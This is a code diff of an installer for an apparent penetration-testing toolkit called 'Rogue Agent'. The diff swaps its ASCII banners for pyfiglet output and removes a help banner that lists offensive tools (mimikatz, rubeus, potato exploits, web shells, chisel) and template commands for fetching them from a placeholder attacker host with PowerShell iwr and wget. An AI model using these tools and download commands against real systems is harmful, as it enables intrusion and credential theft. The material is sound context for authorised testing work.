@@ -19,6 +19,8 @@ import sys
 import shutil
 import os.path
 import sqlite3
+import pyfiglet 
+from termcolor import colored
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -31,19 +33,7 @@ import sqlite3
 if os.geteuid() != 0:
    print("\n[*] Please run this python3 script as root...")
    exit(1)
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Define temporary system colours
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-Red    = '\e[1;91m'
-Yellow = '\e[1;93m'
-Reset  = '\e[0m'
-
+   
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -52,18 +42,11 @@ Reset  = '\e[0m'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-os.system("echo '" + Red + "'")
 os.system("clear")
-
-print("\t\t\t\t\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   ")
-print("\t\t\t\t\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  ")
-print("\t\t\t\t\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    ")
-print("\t\t\t\t\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    ")
-print("\t\t\t\t\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|  ")
-
-os.system("echo '" + Yellow + "'")
-print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
-os.system("echo '" + Reset + "'")
+ascii_banner = pyfiglet.figlet_format("ROGUE  AGENT") 
+ascii_banner = ascii_banner.rstrip("\n")
+print(colored(ascii_banner,"red", attrs=['bold']))
+print(colored("\t\tT R E A D S T O N E  E D I T I O N\n", "yellow", attrs=['bold']))
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -83,48 +66,6 @@ for x in range(0, len(dirList)):
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Create program banners
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-print("\n\n[*] Creating program banners, please wait...")
-os.chdir("ROGUEAGENT")
-
-with open("banner2.txt", "w") as banner:
-   banner.write("\t\t\t\t\t\t _   _ _____ _____ ____    ____  _____ ______     _______ ____              \n")
-   banner.write("\t\t\t\t\t\t| | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \             \n")
-   banner.write("\t\t\t\t\t\t| |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) |            \n")
-   banner.write("\t\t\t\t\t\t|  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <             \n")
-   banner.write("\t\t\t\t\t\t|_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\            \n")
-   banner.write("\t\t\t\t\t\t                                                                          \n\n")   
-   banner.write("ENUMERATION\t\tSHELLS\t\t\tRUNNING PROCESSES\t\tCOMMUNICATIONS\t\t\tCORE EXPLOITS       \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted                    \n")
-   banner.write("powershell 'iwr -Uri http://IP:PORT/TREADSTONE/filename' -outfile filename              \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("jawsenum.ps1\t\twinshell32.exe\t\tpowerup.ps1\t\t\tnc64.exe\t\t\tmimidump.ps1           \n")
-   banner.write("sharphound.ps1\t\twinshell64.exe\t\tpowercat.ps\t\t\tplink64.exe\t\t\tmimikatz.ps1      \n")
-   banner.write("sharphound.exe\t\twebshell.php\t\tpowerview.ps1\t\t\twin_chisel64.exe\t\twinpwn.ps1     \n")
-   banner.write("winpeas32.exe\t\tmyshell.jpg\t\tpowermad.ps1\t\t\twin_chisel32.exe\t\tlovelypotato.ps1  \n")
-   banner.write("winpeas64.exe\t\t\t\t\tprocdump32.exe\t\t\ttest_clsid.bat\t\t\troguepotato.exe          \n")
-   banner.write("rubeus.exe\t\t\t\t\tprocdump64.exe\t\t\trogueoxidresolver.exet\t\tmimikatz64.exe        \n")
-   banner.write("nmapsetup.exe\t\t\t\t\t\t\t\t\t\t\t\t\tmimikatz32.exe                                   \n")   
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("wget 'http://IP:PORT/TREADSTONE/fileame                                                 \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("coffee.sh\t\tlinshell32.elf\t\tpspy32\t\t\t\tlin_chisel64\t\t\tnaughtycowcompile.sh     \n")
-   banner.write("linpeas.sh\t\tlineshell64.elf\t\tpspy64\t\t\t\tlin_chisel32\t\t\tnaughycow.c            \n")
-   banner.write("linenum.sh                                                                              \n")
-   banner.write("linenumplus.sh                                                                          \n")
-   banner.write("linpe.sh                                                                                \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-
-os.chdir("..")
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
 # Details : Install system requirements
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -136,7 +77,7 @@ list1 = ["sqlite3", "bloodhound", "hashcat", "python3-pip", "python3-ldap", "gob
 for x in range(0, len(list1)):
    os.system("apt-get install " + list1[x] + " -y >> log.txt 2>&1")
 
-list2 = ["bloodhound", "kerbrute", "smtp-user-enum", "termcolor"]
+list2 = ["bloodhound", "kerbrute", "smtp-user-enum", "termcolor", "pyfiglet"]
 
 for x in range(0, len(list2)):
   os.system("pip3 install " + list2[x] + " >> log.txt 2>&1")
